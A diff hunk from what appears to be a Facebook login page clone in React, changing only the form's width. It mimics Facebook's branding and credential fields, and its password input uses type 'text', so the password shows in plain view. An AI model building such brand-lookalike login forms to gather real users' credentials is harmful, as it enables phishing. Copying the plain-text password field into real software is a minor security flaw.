@@ -20,7 +20,7 @@ password : "",
   return (
    <>
     <div className='text-center mt-[15%] text-4xl font-bold text-blue-500 md:text-6xl md:mt-[5%] '>facebook</div>
-    <form className='boxShadow w-[95%] h-[450px] mx-auto mt-[2%] rounded-lg flex flex-col gap-[15px] md:w-[33%]'>
+    <form className='boxShadow w-[95%] h-[450px] mx-auto mt-[2%] rounded-lg flex flex-col gap-[15px] md:w-[30%]'>
       <p className='text-xl text-center pt-[7%] md:text-2xl opacity-50'>Log in to facebook</p>
       <input className='border w-[95%] mx-auto h-[45px] p-[2%] text-lg rounded-md' type="text" name='mailPhone' value={mailPhone} placeholder='Email address or phone number' onChange={changeHandler}/>
       <input className='border w-[95%] mx-auto h-[45px] p-[2%] text-lg rounded-md' type="text" name='password' value={password} placeholder='Password' onChange={changeHandler}/>
